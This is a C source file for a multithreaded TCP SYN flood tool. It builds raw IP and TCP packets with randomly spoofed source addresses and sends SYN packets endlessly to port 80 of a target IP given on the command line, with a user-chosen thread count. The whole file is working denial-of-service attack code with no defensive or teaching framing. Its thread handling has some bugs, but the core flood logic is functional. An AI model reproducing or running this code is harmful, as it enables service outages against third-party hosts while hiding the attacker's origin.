#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <stdbool.h>
#include <signal.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/tcp.h> // tcp headers
#include <netinet/ip.h>  // ip headers
#include <arpa/inet.h>
#include <unistd.h>

struct pseudo_header
{
  u_int32_t source_address;
  u_int32_t destination_address;
  u_int8_t placeholder;
  u_int8_t protocol;
  u_int16_t tcp_length;
};

int i;
int max_threads;
pthread_t *th;
int raw_socket;
char *pseudogram;
char datagram[4096];
char source_ip[32];
char *data;
struct iphdr *iph;
struct tcphdr *tcph;
struct sockaddr_in s_in;
struct pseudo_header psh;
int psize;
int one = 1;
const int *val = &one;

void check_socket(int socket);
unsigned short csum(const char *buf, unsigned size);
void handle_signal(int sig);
void remove_char(char *string, char garbage);
int random_int(int min, int max);
void random_ip(char *string);
void *syn_flood(void *data);

int main(int argc, char *argv[])
{
  if (argc < 2) {
    printf("Please provide a destination IP address\n");
    exit(EXIT_FAILURE);
  }
  else if (argc < 3) {
    printf("Please provide a payload\n");
    exit(EXIT_FAILURE);
  }
  else if (argc < 4) {
    printf("Please provide the number of threads\n");
  }

  max_threads = atoi(argv[3]);
  th = (pthread_t*)malloc(max_threads*sizeof(pthread_t));

  srand(time(NULL));

  // raw socket
  raw_socket = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
  check_socket(raw_socket);

  memset(datagram, 0, sizeof(datagram));

  iph = (struct iphdr *)datagram;

  tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));

  data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
  strcpy(data, argv[2]);

  for (i=0; i < max_threads; i++) {
    if (pthread_create(&th[i], NULL, &syn_flood, (void *)argv[1]) != 0)
    {
      exit(EXIT_FAILURE);
    }
  }

  for (i=0; i < max_threads; i++) {
    if (pthread_join(th[i], NULL) != 0)
    {
      exit(EXIT_FAILURE);
    }
  }

  return 0;
}

void *syn_flood(void *data)
{
  char *target_ip = ((char *)data);

  signal(SIGINT, handle_signal);
  while (true)
  {
    // address resolution
    random_ip(source_ip); // spoofed IP address - ex: 192.168.1.2
    s_in.sin_family = AF_INET;
    s_in.sin_port = htons(80); // port
    s_in.sin_addr.s_addr = inet_addr(target_ip); // target IP

    // IP header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data);
    iph->id = htonl(54321); // packet id
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr(source_ip); // source ip address
    iph->daddr = s_in.sin_addr.s_addr;  // destination ip address

    // IP checksum
    iph->check = csum(datagram, iph->tot_len);

    // TCP header
    remove_char(source_ip,'.');
    tcph->source = htons(atoi(source_ip));
    tcph->dest = htons(80);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5; // tcp header size
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(5840); // maximum allowed window size
    tcph->check = 0;            // leave checksum 0 now, filled later by pseudo header
    tcph->urg_ptr = 0;

    // TCP checksum
    psh.source_address = inet_addr(source_ip);
    psh.destination_address = s_in.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data));

    psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
    pseudogram = malloc(psize);

    memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + strlen(data));

    tcph->check = csum(pseudogram, psize);

    // IP_HDRINCL to tell the kernel that headers are included in the packet
    if (setsockopt(raw_socket, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
      perror("Error setting IP_HDRINCL");
      printf("Error code: %d\n", errno);
      exit(EXIT_FAILURE);
    }

    // Send the packet
    if (sendto(raw_socket, datagram, iph->tot_len, 0, (struct sockaddr *)&s_in, sizeof(s_in)) < 0)
    {
      perror("sendto failed");
      printf("Error code: %d\n", errno);
    }
    // Data send successfully
    else
    {
      printf("Packet Send. Length : %d \n", iph->tot_len);
    }
    // sleep for 1 second
    //sleep(1);
  }
}

void check_socket(int socket)
{
  if (socket < 0)
  {
    perror("Socket criation error");
    printf("Error code: %d\n", errno);
    exit(EXIT_FAILURE);
  }
  else
  {
    printf("Socket created\n");
  }
}

unsigned short csum(const char *buf, unsigned size)
{
  unsigned long long sum = 0;
  const unsigned long long *b = (unsigned long long *)buf;

  unsigned t1, t2;
  unsigned short t3, t4;

  /* Main loop - 8 bytes at a time */
  while (size >= sizeof(unsigned long long))
  {
    unsigned long long s = *b++;
    sum += s;
    if (sum < s)
      sum++;
    size -= 8;
  }

  /* Handle tail less than 8-bytes long */
  buf = (const char *)b;
  if (size & 4)
  {
    unsigned s = *(unsigned *)buf;
    sum += s;
    if (sum < s)
      sum++;
    buf += 4;
  }

  if (size & 2)
  {
    unsigned short s = *(unsigned short *)buf;
    sum += s;
    if (sum < s)
      sum++;
    buf += 2;
  }

  if (size)
  {
    unsigned char s = *(unsigned char *)buf;
    sum += s;
    if (sum < s)
      sum++;
  }

  /* Fold down to 16 bits */
  t1 = sum;
  t2 = sum >> 32;
  t1 += t2;
  if (t1 < t2)
    t1++;
  t3 = t1;
  t4 = t1 >> 16;
  t3 += t4;
  if (t3 < t4)
    t3++;

  return ~t3;
}

void handle_signal(int sig)
{
  printf("\nCaught interrupt signal %d\n", sig);
  puts("Releasing resources ...");
  free(pseudogram);
  for (i=0; i < max_threads; i++) {
    if (pthread_join(th[i], NULL) != 0)
    {
      exit(EXIT_FAILURE);
    }
  }
  // closes the socket
  puts("Closing socket ...");
  if (close(raw_socket) == 0)
  {
    puts("Socket closed!");
    exit(EXIT_SUCCESS);
  }
  else
  {
    perror("An error occurred while closing the socket: ");
    printf("Error code: %d\n", errno);
    exit(EXIT_FAILURE);
  }
}

void remove_char(char *string, char garbage) {

    char *src, *dst;
    for (src = dst = string; *src != '\0'; src++) {
        *dst = *src;
        if (*dst != garbage) dst++;
    }
    *dst = '\0';
}

int random_int(int min, int max)
{
    int k;
    double d;
    d = (double)rand() / ((double)RAND_MAX + 1);
    k = d * (max - min + 1);
    return min + k;
}

void random_ip(char *string)
{
  int octet1 = random_int(0, 255);
  int octet2 = random_int(0, 255);
  int octet3 = random_int(0, 255);
  int octet4 = random_int(0, 255);

  sprintf(string, "%d.%d.%d.%d", octet1, octet2, octet3, octet4);
}
